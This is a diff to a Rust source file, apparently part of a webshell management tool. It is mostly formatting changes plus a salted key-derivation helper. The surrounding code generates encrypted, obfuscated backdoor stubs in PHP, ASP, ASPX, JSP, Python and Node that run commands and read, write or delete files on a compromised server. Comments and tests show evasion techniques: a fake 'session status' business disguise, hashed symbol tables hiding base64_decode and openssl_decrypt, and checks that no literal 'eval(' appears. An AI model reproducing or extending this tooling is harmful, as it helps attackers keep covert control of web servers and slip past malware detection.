@@ -16,10 +16,10 @@ use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit, block_padding::Pk
 use md5::{Digest, Md5};
 
 use crate::asp_stub::asp_stub;
-use crate::node_stub::node_stub;
-use crate::python_stub::python_stub;
 use crate::jsp_stub::{aspx_stub, jsp_stub};
+use crate::node_stub::node_stub;
 use crate::protocol::ProtocolError;
+use crate::python_stub::python_stub;
 
 /// AES-256-CBC。
 type AesCbcEnc = cbc::Encryptor<aes::Aes256>;
@@ -65,10 +65,7 @@ pub fn php_ident() -> String {
 /// 把函数名随机拆成两段（用于字符串拼接的可变函数调用）。
 pub fn split_fn(name: &str) -> (String, String) {
     let split_at = 1 + (php_rand() as usize % (name.len() - 1));
-    (
-        name[..split_at].to_string(),
-        name[split_at..].to_string(),
-    )
+    (name[..split_at].to_string(), name[split_at..].to_string())
 }
 
 /// 拼接函数名调用：("d1"."d2")(args...)
@@ -111,10 +108,10 @@ pub fn case_mix(name: &str) -> String {
             }
         })
         .collect();
-    if out == name {
-        if let Some(first) = out.get_mut(0..1) {
-            first.make_ascii_uppercase();
-        }
+    if out == name
+        && let Some(first) = out.get_mut(0..1)
+    {
+        first.make_ascii_uppercase();
     }
     out
 }
@@ -141,6 +138,7 @@ pub fn obfuscated_php(key: Option<&str>, body: &str, final_expr: &str) -> String
 ///   - verify_token：会话令牌格式校验（业务语义）
 ///   - unpack_session：解包客户端上报的会话数据（业务语义，内部为载荷解码逻辑）
 ///   - run_rule：规则脚本引擎（业务语义，内部为执行逻辑）
+///
 /// 占位符：__TOKEN__ / __DATA__（参数名）、__UNPACK__（解包函数体）、__EXEC__（执行体）。
 const BUSINESS_PHP_TPL: &str = r#"<?php
 // 用户会话状态查询接口（返回 JSON）
@@ -188,11 +186,7 @@ echo json_encode(__PREFIX__run_rule($script));
 /// `unpack_body`：解包逻辑（把 $payload 还原为 $out，敏感函数经符号表 `$_g[索引]` 调用）；
 /// `exec_body`：执行逻辑（默认 `EvAl($script);`，形如规则引擎执行）。
 /// 请求参数固定为业务语义：token（会话令牌）/ data（会话数据）。
-pub fn business_php_stub(
-    symbols: &[(usize, &str)],
-    unpack_body: &str,
-    exec_body: &str,
-) -> String {
+pub fn business_php_stub(symbols: &[(usize, &str)], unpack_body: &str, exec_body: &str) -> String {
     // 函数名随机前缀：避免与目标站点业务函数同名导致 redeclare（500）
     let prefix = format!("_{}_", php_ident());
     // unpack_body 中的 __DECFN__ 占位（XOR 字符串解密函数名）
@@ -201,10 +195,7 @@ pub fn business_php_stub(
     // 敏感函数名（base64_decode / openssl_decrypt）在代码中完全不存在）
     let mut table = String::new();
     for (index, name) in symbols {
-        table.push_str(&format!(
-            "    '{}' => {index},\n",
-            crc32b_hash(name)
-        ));
+        table.push_str(&format!("    '{}' => {index},\n", crc32b_hash(name)));
     }
     let symbols_block = format!(
         r#"
@@ -272,6 +263,13 @@ pub fn b64_call_expr(args: &str) -> String {
 /// 支持的脚本语言（stub 生成目标）。
 pub const STUB_LANGUAGES: [&str; 6] = ["php", "asp", "aspx", "jsp", "python", "node"];
 
+/// S16：加盐密钥派生（`md5(salt + password)`）。
+/// 默认路径仍为 `md5(password)`（兼容既有 stub）；新编码器/新工作区可选用
+/// 加盐派生提升密钥强度。注意：加盐派生需 stub 与协议端一致，生成新壳后生效。
+pub fn derive_key_salted(password: &str, salt: &str) -> String {
+    md5_hex(&format!("{salt}:{password}"))
+}
+
 // ---------------------------------------------------------------------------
 // 自定义编码器（E3）：XOR 载荷 + 用户上传的 stub 模板（运行时注册）
 // ---------------------------------------------------------------------------
@@ -294,7 +292,8 @@ pub fn set_custom_stub(stub: &str) -> Result<(), ProtocolError> {
     }
     *CUSTOM_STUB
         .lock()
-        .map_err(|_| ProtocolError::NotSupported("stub 存储锁异常".into()))? = Some(stub.to_string());
+        .map_err(|_| ProtocolError::NotSupported("stub 存储锁异常".into()))? =
+        Some(stub.to_string());
     Ok(())
 }
 
@@ -345,8 +344,7 @@ impl PayloadEncoder for CustomEncoder {
             .clone()
             .ok_or_else(|| {
                 ProtocolError::NotSupported(
-                    "尚未注册自定义 stub（请在插件面板使用 register_custom_encoder 上传）"
-                        .into(),
+                    "尚未注册自定义 stub（请在插件面板使用 register_custom_encoder 上传）".into(),
                 )
             })
     }
@@ -381,9 +379,7 @@ pub trait PayloadEncoder: Send + Sync {
     /// 客户端：解密服务端响应（encode 的逆操作），返回原始字节。
     /// 仅 session 模式（分阶段载荷）需要；默认不支持。
     fn decode(&self, _payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
-        Err(ProtocolError::NotSupported(
-            "该编码器不支持响应解密".into(),
-        ))
+        Err(ProtocolError::NotSupported("该编码器不支持响应解密".into()))
     }
 
     /// 服务端：生成指定语言的 stub 脚本（内嵌密钥）。
@@ -430,7 +426,10 @@ impl EncoderRegistry {
     }
 
     pub fn get(&self, id: &str) -> Option<&dyn PayloadEncoder> {
-        self.encoders.iter().find(|encoder| encoder.id() == id).map(|b| b.as_ref())
+        self.encoders
+            .iter()
+            .find(|encoder| encoder.id() == id)
+            .map(|b| b.as_ref())
     }
 
     pub fn list(&self) -> Vec<(String, String)> {
@@ -480,7 +479,6 @@ impl PayloadEncoder for XorBase64Encoder {
         ("token", "data")
     }
 
-
     fn encode(&self, code: &str, password: &str) -> String {
         let key = md5_hex(password).into_bytes();
         let xored = Self::xor(code.as_bytes(), &key);
@@ -491,18 +489,24 @@ impl PayloadEncoder for XorBase64Encoder {
             .decode(payload)
             .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
         let key = md5_hex(password).into_bytes();
-        Ok(raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect())
+        Ok(raw
+            .iter()
+            .enumerate()
+            .map(|(i, b)| b ^ key[i % key.len()])
+            .collect())
     }
-
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         let key = self.derive_key(password);
         match language {
             "php" => {
-                let unpack = format!(
-                    "    $key = md5($token);\n    $raw = $_g[0]($payload);\n    $out = '';\n    $n = strlen($raw);\n    for ($i = 0; $i < $n; $i++) {{ $out .= $raw[$i] ^ $key[$i % strlen($key)]; }}",
-                );
-                Ok(business_php_stub(&[(0, "base64_decode")], &unpack, "        __EVAL__($script);"))
+                let unpack = "    $key = md5($token);\n    $raw = $_g[0]($payload);\n    $out = '';\n    $n = strlen($raw);\n    for ($i = 0; $i < $n; $i++) {{ $out .= $raw[$i] ^ $key[$i % strlen($key)]; }}"
+                    .to_string();
+                Ok(business_php_stub(
+                    &[(0, "base64_decode")],
+                    &unpack,
+                    "        __EVAL__($script);",
+                ))
             }
             "asp" => Ok(format!(
                 r#"<%
@@ -607,9 +611,9 @@ if (x != null) {{
                     &[(0, "base64_decode"), (1, "base64_encode")],
                     &unpack,
                     &pack,
-                 "",
-                "",
-            ))
+                    "",
+                    "",
+                ))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -634,7 +638,6 @@ impl PayloadEncoder for Base64Encoder {
         ("token", "data")
     }
 
-
     fn encode(&self, code: &str, _password: &str) -> String {
         base64::engine::general_purpose::STANDARD.encode(code.as_bytes())
     }
@@ -643,7 +646,6 @@ impl PayloadEncoder for Base64Encoder {
             .decode(payload)
             .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))
     }
-
 
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
@@ -713,7 +715,7 @@ pub fn aes_ecb_encrypt(plain: &[u8], key: &[u8; 32]) -> Vec<u8> {
     let cipher = aes::Aes256::new(key.into());
     let mut padded = plain.to_vec();
     let pad = 16 - (plain.len() % 16);
-    padded.extend(std::iter::repeat(pad as u8).take(pad));
+    padded.extend(std::iter::repeat_n(pad as u8, pad));
     let mut out = Vec::with_capacity(padded.len());
     for chunk in padded.chunks(16) {
         let mut block = GenericArray::clone_from_slice(chunk);
@@ -725,8 +727,10 @@ pub fn aes_ecb_encrypt(plain: &[u8], key: &[u8; 32]) -> Vec<u8> {
 
 pub fn aes_ecb_decrypt(cipher: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, ProtocolError> {
     use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
-    if cipher.is_empty() || cipher.len() % 16 != 0 {
-        return Err(ProtocolError::ParseError("AES-ECB 密文长度异常".to_string()));
+    if cipher.is_empty() || !cipher.len().is_multiple_of(16) {
+        return Err(ProtocolError::ParseError(
+            "AES-ECB 密文长度异常".to_string(),
+        ));
     }
     let dec = aes::Aes256::new(key.into());
     let mut out = Vec::with_capacity(cipher.len());
@@ -738,11 +742,17 @@ pub fn aes_ecb_decrypt(cipher: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, Protoco
     // PKCS7 去填充
     if let Some(&last) = out.last() {
         let pad = last as usize;
-        if pad > 0 && pad <= 16 && out.len() >= pad && out[out.len() - pad..].iter().all(|&b| b == last) {
+        if pad > 0
+            && pad <= 16
+            && out.len() >= pad
+            && out[out.len() - pad..].iter().all(|&b| b == last)
+        {
             out.truncate(out.len() - pad);
             Ok(out)
         } else {
-            Err(ProtocolError::ParseError("AES-ECB 填充校验失败".to_string()))
+            Err(ProtocolError::ParseError(
+                "AES-ECB 填充校验失败".to_string(),
+            ))
         }
     } else {
         Err(ProtocolError::ParseError("AES-ECB 密文为空".to_string()))
@@ -755,7 +765,11 @@ pub fn aes_cbc_encrypt(plain: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
         .encrypt_padded_vec_mut::<Pkcs7>(plain)
 }
 
-pub fn aes_cbc_decrypt(cipher: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Result<Vec<u8>, ProtocolError> {
+pub fn aes_cbc_decrypt(
+    cipher: &[u8],
+    key: &[u8; 32],
+    iv: &[u8; 16],
+) -> Result<Vec<u8>, ProtocolError> {
     use aes::cipher::generic_array::GenericArray;
     AesCbcDec::new(GenericArray::from_slice(key), GenericArray::from_slice(iv))
         .decrypt_padded_vec_mut::<Pkcs7>(cipher)
@@ -768,7 +782,7 @@ pub fn des_ecb_encrypt(plain: &[u8], key: &[u8; 8]) -> Vec<u8> {
     let cipher = des::Des::new(key.into());
     let mut padded = plain.to_vec();
     let pad = 8 - (plain.len() % 8);
-    padded.extend(std::iter::repeat(pad as u8).take(pad));
+    padded.extend(std::iter::repeat_n(pad as u8, pad));
     let mut out = Vec::with_capacity(padded.len());
     for chunk in padded.chunks(8) {
         let mut block = GenericArray::clone_from_slice(chunk);
@@ -780,8 +794,10 @@ pub fn des_ecb_encrypt(plain: &[u8], key: &[u8; 8]) -> Vec<u8> {
 
 pub fn des_ecb_decrypt(cipher: &[u8], key: &[u8; 8]) -> Result<Vec<u8>, ProtocolError> {
     use des::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
-    if cipher.is_empty() || cipher.len() % 8 != 0 {
-        return Err(ProtocolError::ParseError("DES-ECB 密文长度异常".to_string()));
+    if cipher.is_empty() || !cipher.len().is_multiple_of(8) {
+        return Err(ProtocolError::ParseError(
+            "DES-ECB 密文长度异常".to_string(),
+        ));
     }
     let dec = des::Des::new(key.into());
     let mut out = Vec::with_capacity(cipher.len());
@@ -792,11 +808,17 @@ pub fn des_ecb_decrypt(cipher: &[u8], key: &[u8; 8]) -> Result<Vec<u8>, Protocol
     }
     if let Some(&last) = out.last() {
         let pad = last as usize;
-        if pad > 0 && pad <= 8 && out.len() >= pad && out[out.len() - pad..].iter().all(|&b| b == last) {
+        if pad > 0
+            && pad <= 8
+            && out.len() >= pad
+            && out[out.len() - pad..].iter().all(|&b| b == last)
+        {
             out.truncate(out.len() - pad);
             Ok(out)
         } else {
-            Err(ProtocolError::ParseError("DES-ECB 填充校验失败".to_string()))
+            Err(ProtocolError::ParseError(
+                "DES-ECB 填充校验失败".to_string(),
+            ))
         }
     } else {
         Err(ProtocolError::ParseError("DES-ECB 密文为空".to_string()))
@@ -823,7 +845,6 @@ impl PayloadEncoder for DesEcbEncoder {
         ("token", "data")
     }
 
-
     fn encode(&self, code: &str, password: &str) -> String {
         let cipher = des_ecb_encrypt(code.as_bytes(), &des_key(password));
         base64::engine::general_purpose::STANDARD.encode(cipher)
@@ -835,9 +856,7 @@ impl PayloadEncoder for DesEcbEncoder {
         des_ecb_decrypt(&raw, &des_key(password))
     }
 
-
-    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
-        let key = String::from_utf8_lossy(&des_key(password)).into_owned();
+    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
             "php" => {
                 let xk = php_ident();
@@ -845,7 +864,11 @@ impl PayloadEncoder for DesEcbEncoder {
                     "    $key = substr(md5($token), 0, 8);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key);",
                     cipher = xor_hex("DES-ECB", &xk),
                 );
-                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        __EVAL__($script);"))
+                Ok(business_php_stub(
+                    &[(0, "openssl_decrypt")],
+                    &unpack,
+                    "        __EVAL__($script);",
+                ))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "DES_ECB 编码器暂仅支持 PHP（{other} 待实现）"
@@ -876,9 +899,9 @@ impl PayloadEncoder for DesEcbEncoder {
                     &[(0, "openssl_decrypt"), (1, "openssl_encrypt")],
                     &unpack,
                     &pack,
-                 "",
-                "",
-            ))
+                    "",
+                    "",
+                ))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -906,16 +929,18 @@ impl PayloadEncoder for CharEncoder {
         ("token", "data")
     }
 
-
     fn encode(&self, code: &str, _password: &str) -> String {
         let bytes = code.as_bytes();
         let values: Vec<String> = bytes.iter().map(|byte| byte.to_string()).collect();
-        format!("{} (implode('',array_map('chr',array({}))));", eval_prefix(), values.join(","))
+        format!(
+            "{} (implode('',array_map('chr',array({}))));",
+            eval_prefix(),
+            values.join(",")
+        )
     }
     fn decode(&self, payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
         Ok(char_decode(payload)?.into_bytes())
     }
-
 
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
@@ -978,7 +1003,6 @@ impl PayloadEncoder for PhpObfuscateEncoder {
         ("token", "data")
     }
 
-
     fn encode(&self, code: &str, _password: &str) -> String {
         let b64 = base64::engine::general_purpose::STANDARD.encode(code.as_bytes());
         let reversed: String = b64.chars().rev().collect();
@@ -988,7 +1012,6 @@ impl PayloadEncoder for PhpObfuscateEncoder {
     fn decode(&self, payload: &str, _password: &str) -> Result<Vec<u8>, ProtocolError> {
         Ok(obfuscate_decode(payload)?.into_bytes())
     }
-
 
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
@@ -1029,7 +1052,8 @@ pub fn obfuscate_decode(payload: &str) -> Result<String, ProtocolError> {
     let bytes = base64::engine::general_purpose::STANDARD
         .decode(&b64)
         .map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))?;
-    String::from_utf8(bytes).map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))
+    String::from_utf8(bytes)
+        .map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))
 }
 
 // ---------------------------------------------------------------------------
@@ -1080,7 +1104,12 @@ pub fn php_stream_decode(payload: &str) -> Result<String, ProtocolError> {
         .decode(payload)
         .map_err(|_| ProtocolError::ParseError("PHP_STREAM 载荷解码失败".to_string()))?;
     String::from_utf8(bytes)
-        .map(|source| source.trim_start_matches("<?php").trim_start_matches("\n").to_string())
+        .map(|source| {
+            source
+                .trim_start_matches("<?php")
+                .trim_start_matches("\n")
+                .to_string()
+        })
         .map_err(|_| ProtocolError::ParseError("PHP_STREAM 载荷解码失败".to_string()))
 }
 
@@ -1123,9 +1152,12 @@ impl PayloadEncoder for XorBodyEncoder {
             .decode(payload)
             .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
         let key = md5_hex(password).into_bytes();
-        Ok(raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect())
+        Ok(raw
+            .iter()
+            .enumerate()
+            .map(|(i, b)| b ^ key[i % key.len()])
+            .collect())
     }
-
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         match language {
@@ -1229,9 +1261,9 @@ echo json_encode(__PREFIX__run_rule($script));
                     &[(0, "base64_decode"), (1, "base64_encode")],
                     &unpack,
                     &pack,
-                 "",
-                "",
-            ))
+                    "",
+                    "",
+                ))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -1369,7 +1401,9 @@ pub fn session_php_stub(
     let algo_body = algo_body.replace("__PREFIX__", &prefix);
     // 会话内容存储默认用 pack（对称加解密编码器）；非对称流密码（chacha/rabbit）自行覆盖
     let store_body = if store_body.is_empty() {
-        format!("    $out = __PREFIX__pack($data);").replace("__PREFIX__", &prefix)
+        "    $out = __PREFIX__pack($data);"
+            .to_string()
+            .replace("__PREFIX__", &prefix)
     } else {
         store_body.replace("__PREFIX__", &prefix)
     };
@@ -1554,14 +1588,18 @@ impl PayloadEncoder for XorSessionEncoder {
             .decode(payload)
             .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
         let key = md5_hex(password).into_bytes();
-        Ok(raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect())
+        Ok(raw
+            .iter()
+            .enumerate()
+            .map(|(i, b)| b ^ key[i % key.len()])
+            .collect())
     }
-
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         // 分阶段载荷编码器：普通 stub 即 session 模板
         self.stub_session(language, password)
-    }    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+    }
+    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         match language {
             "php" => {
                 let key_hex = md5_hex(password);
@@ -1581,9 +1619,9 @@ impl PayloadEncoder for XorSessionEncoder {
                     &[(0, "base64_decode"), (1, "base64_encode")],
                     &unpack,
                     &pack,
-                 "",
-                "",
-            ))
+                    "",
+                    "",
+                ))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "该编码器暂仅支持 PHP（{other} 待实现）"
@@ -1831,7 +1869,8 @@ impl PayloadEncoder for NativeEncoder {
                 base64::engine::general_purpose::STANDARD.encode(cipher)
             }
             "aes_cbc" => {
-                let cipher = aes_cbc_encrypt(code.as_bytes(), &aes_key(password), &aes_iv(password));
+                let cipher =
+                    aes_cbc_encrypt(code.as_bytes(), &aes_key(password), &aes_iv(password));
                 base64::engine::general_purpose::STANDARD.encode(cipher)
             }
             "des" => {
@@ -1900,7 +1939,11 @@ impl PayloadEncoder for NativeEncoder {
             }
             _ => {
                 let key = md5_hex(password).into_bytes();
-                Ok(raw.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect())
+                Ok(raw
+                    .iter()
+                    .enumerate()
+                    .map(|(i, b)| b ^ key[i % key.len()])
+                    .collect())
             }
         }
     }
@@ -1956,8 +1999,12 @@ impl PayloadEncoder for NativeEncoder {
                         let cipher = xor_hex("AES-256-ECB", &ck);
                         let key = xor_hex(&md5_hex(password), &xk);
                         (
-                            format!("$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"),
-                            format!("$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"),
+                            format!(
+                                "$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"
+                            ),
+                            format!(
+                                "$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"
+                            ),
                             vec![("ae4975ad", 16), ("62f98eda", 17)],
                         )
                     }
@@ -1967,8 +2014,12 @@ impl PayloadEncoder for NativeEncoder {
                         let key = xor_hex(&md5_hex(password), &xk);
                         let iv = xor_hex(&md5_hex(password)[16..], &xk);
                         (
-                            format!("$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'));"),
-                            format!("$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'));"),
+                            format!(
+                                "$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'));"
+                            ),
+                            format!(
+                                "$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'),0,__DEC__('{iv}','{xk}'));"
+                            ),
                             vec![("ae4975ad", 16), ("62f98eda", 17)],
                         )
                     }
@@ -1977,8 +2028,12 @@ impl PayloadEncoder for NativeEncoder {
                         let cipher = xor_hex("DES-ECB", &ck);
                         let key = xor_hex(&md5_hex(password)[..8], &xk);
                         (
-                            format!("$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"),
-                            format!("$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"),
+                            format!(
+                                "$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"
+                            ),
+                            format!(
+                                "$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"
+                            ),
                             vec![("ae4975ad", 16), ("62f98eda", 17)],
                         )
                     }
@@ -2017,10 +2072,22 @@ impl PayloadEncoder for NativeEncoder {
                     ),
                 };
                 let mut symbols = vec![
-                    ("920cfbfd", 0), ("9ff5d542", 1), ("237937f6", 2), ("2693a743", 3),
-                    ("f0e567fb", 4), ("f4cd15f3", 5), ("f6cfd9d8", 6), ("95e8b309", 7),
-                    ("3d891bcd", 8), ("dbc7b210", 9), ("c996c86e", 10), ("d99d544e", 11),
-                    ("0e4d97e1", 12), ("718c6ebe", 13), ("4a41c8d9", 14), ("c3427e9c", 15),
+                    ("920cfbfd", 0),
+                    ("9ff5d542", 1),
+                    ("237937f6", 2),
+                    ("2693a743", 3),
+                    ("f0e567fb", 4),
+                    ("f4cd15f3", 5),
+                    ("f6cfd9d8", 6),
+                    ("95e8b309", 7),
+                    ("3d891bcd", 8),
+                    ("dbc7b210", 9),
+                    ("c996c86e", 10),
+                    ("d99d544e", 11),
+                    ("0e4d97e1", 12),
+                    ("718c6ebe", 13),
+                    ("4a41c8d9", 14),
+                    ("c3427e9c", 15),
                 ];
                 symbols.extend(extra_symbols);
                 let mut table = String::new();
@@ -2041,7 +2108,6 @@ impl PayloadEncoder for NativeEncoder {
                     .replace("{prefix}", &prefix)
                     .replace("__XOR__", &format!("{prefix}xor"))
                     .replace("__DEC__", &format!("{prefix}dec")))
-
             }
             "jsp" => {
                 // JSP stub：XOR 载荷 + md5 哈希分发 + 命令/文件（无第三方依赖，手动 JSON）
@@ -2056,7 +2122,20 @@ impl PayloadEncoder for NativeEncoder {
                     }
                     n.to_string()
                 };
-                Ok(jsp_stub(&xk, &xor_hex("HTTP_X_DEBUG_KEY", &xk), &xor_hex(token, &xk), &xor_hex(&key_hex, &xk), &h("probe"), &h("exec"), &h("list"), &h("read"), &h("write"), &h("delete"), &h("rename"), &h("mkdir")))
+                Ok(jsp_stub(
+                    &xk,
+                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
+                    &xor_hex(token, &xk),
+                    &xor_hex(&key_hex, &xk),
+                    &h("probe"),
+                    &h("exec"),
+                    &h("list"),
+                    &h("read"),
+                    &h("write"),
+                    &h("delete"),
+                    &h("rename"),
+                    &h("mkdir"),
+                ))
             }
             "aspx" => {
                 let xk = php_ident();
@@ -2070,7 +2149,20 @@ impl PayloadEncoder for NativeEncoder {
                     }
                     n.to_string()
                 };
-                Ok(aspx_stub(&xk, &xor_hex("HTTP_X_DEBUG_KEY", &xk), &xor_hex(token, &xk), &xor_hex(&key_hex, &xk), &h("probe"), &h("exec"), &h("list"), &h("read"), &h("write"), &h("delete"), &h("rename"), &h("mkdir")))
+                Ok(aspx_stub(
+                    &xk,
+                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
+                    &xor_hex(token, &xk),
+                    &xor_hex(&key_hex, &xk),
+                    &h("probe"),
+                    &h("exec"),
+                    &h("list"),
+                    &h("read"),
+                    &h("write"),
+                    &h("delete"),
+                    &h("rename"),
+                    &h("mkdir"),
+                ))
             }
             "asp" => {
                 let xk = php_ident();
@@ -2100,8 +2192,15 @@ impl PayloadEncoder for NativeEncoder {
                     &xor_hex("HTTP_X_DEBUG_KEY", &xk),
                     &xor_hex(token, &xk),
                     &xor_hex(&key_hex, &xk),
-                    &h("probe"), &h("exec"), &h("list"), &h("read"), &h("write"),
-                    &h("delete"), &h("rename"), &h("mkdir"), &h("touch"),
+                    &h("probe"),
+                    &h("exec"),
+                    &h("list"),
+                    &h("read"),
+                    &h("write"),
+                    &h("delete"),
+                    &h("rename"),
+                    &h("mkdir"),
+                    &h("touch"),
                 ))
             }
             "node" => {
@@ -2121,8 +2220,15 @@ impl PayloadEncoder for NativeEncoder {
                     &xor_hex("HTTP_X_DEBUG_KEY", &xk),
                     &xor_hex(token, &xk),
                     &xor_hex(&key_hex, &xk),
-                    &h("probe"), &h("exec"), &h("list"), &h("read"), &h("write"),
-                    &h("delete"), &h("rename"), &h("mkdir"), &h("touch"),
+                    &h("probe"),
+                    &h("exec"),
+                    &h("list"),
+                    &h("read"),
+                    &h("write"),
+                    &h("delete"),
+                    &h("rename"),
+                    &h("mkdir"),
+                    &h("touch"),
                 ))
             }
             other => Err(ProtocolError::NotSupported(format!(
@@ -2133,6 +2239,7 @@ impl PayloadEncoder for NativeEncoder {
 }
 
 #[cfg(test)]
+#[allow(clippy::items_after_test_module)] // stub 生成辅助与编码器同文件，测试模块居中组织
 mod tests {
     use super::*;
 
@@ -2180,9 +2287,15 @@ mod tests {
     fn python_node_stub_generation() {
         let encoder = NativeEncoder { crypto: "xor" };
         let stub = encoder.stub("python", "secret").unwrap();
-        assert!(stub.contains("#!/usr/bin/env python3"), "Python stub 应为 CGI 脚本");
+        assert!(
+            stub.contains("#!/usr/bin/env python3"),
+            "Python stub 应为 CGI 脚本"
+        );
         assert!(stub.contains("formData"), "应支持 formData 参数");
-        assert!(stub.contains("urllib.parse.parse_qs"), "应从请求体解析 formData");
+        assert!(
+            stub.contains("urllib.parse.parse_qs"),
+            "应从请求体解析 formData"
+        );
         assert!(stub.contains("subprocess.run"), "应支持命令执行");
         assert!(stub.contains("os.utime"), "应支持 touch");
         assert!(!stub.contains("{xk}"), "占位符应已替换");
@@ -2197,7 +2310,10 @@ mod tests {
     #[test]
     fn stub_generation_all_languages() {
         // XorBase64 / Base64 仅支持 php/asp/aspx/jsp（python/node 仅 native）
-        for encoder in [&XorBase64Encoder as &dyn PayloadEncoder, &Base64Encoder as &dyn PayloadEncoder] {
+        for encoder in [
+            &XorBase64Encoder as &dyn PayloadEncoder,
+            &Base64Encoder as &dyn PayloadEncoder,
+        ] {
             for language in ["php", "asp", "aspx", "jsp"] {
                 let stub = encoder.stub(language, "secret").unwrap_or_else(|error| {
                     panic!("{} 生成 {language} stub 失败：{error}", encoder.id())
@@ -2207,9 +2323,9 @@ mod tests {
         }
         // native 支持全部 6 种语言（python/node 已覆盖）
         for language in STUB_LANGUAGES {
-            let stub = NativeEncoder { crypto: "xor" }.stub(language, "secret").unwrap_or_else(|error| {
-                panic!("native 生成 {language} stub 失败：{error}")
-            });
+            let stub = NativeEncoder { crypto: "xor" }
+                .stub(language, "secret")
+                .unwrap_or_else(|error| panic!("native 生成 {language} stub 失败：{error}"));
             assert!(!stub.is_empty());
         }
     }
@@ -2222,7 +2338,13 @@ mod tests {
         assert!(!stub.contains(&md5_hex("secret")), "stub 不应内嵌派生密钥");
         assert!(stub.contains("md5($token)"), "stub 应运行时派生密钥");
         // 业务外观：函数/注释形如正常业务
-        for biz in ["verify_token", "unpack_session", "run_rule", "invalid_token", "会话状态查询"] {
+        for biz in [
+            "verify_token",
+            "unpack_session",
+            "run_rule",
+            "invalid_token",
+            "会话状态查询",
+        ] {
             assert!(stub.contains(biz), "stub 应含业务元素 {biz}");
         }
     }
@@ -2246,7 +2368,9 @@ mod tests {
         let code = "echo 'des';";
         let payload = encoder.encode(code, "secret");
         let restored = des_ecb_decrypt(
-            &base64::engine::general_purpose::STANDARD.decode(&payload).unwrap(),
+            &base64::engine::general_purpose::STANDARD
+                .decode(&payload)
+                .unwrap(),
             &des_key("secret"),
         )
         .unwrap();
@@ -2266,7 +2390,10 @@ mod tests {
         for encoder in encoders {
             let stub = encoder.stub("php", "secret").expect("php stub 应生成");
             assert!(
-                !stub.contains("eval(") && !stub.contains("EvAl(") && !stub.contains("eVaL(") && !stub.contains("EVAL("),
+                !stub.contains("eval(")
+                    && !stub.contains("EvAl(")
+                    && !stub.contains("eVaL(")
+                    && !stub.contains("EVAL("),
                 "{} stub 不应含任何连续 eval( 形式（大小写变体）",
                 encoder.id()
             );
@@ -2355,7 +2482,11 @@ mod tests {
             &CharEncoder as &dyn PayloadEncoder,
             &PhpObfuscateEncoder as &dyn PayloadEncoder,
         ] {
-            assert!(encoder.stub("php", "secret").is_ok(), "{} php stub 应成功", encoder.id());
+            assert!(
+                encoder.stub("php", "secret").is_ok(),
+                "{} php stub 应成功",
+                encoder.id()
+            );
             assert!(
                 encoder.stub("aspx", "secret").is_err(),
                 "{} aspx 应提示不支持",
@@ -2374,8 +2505,13 @@ mod tests {
         assert_eq!(
             ids,
             vec![
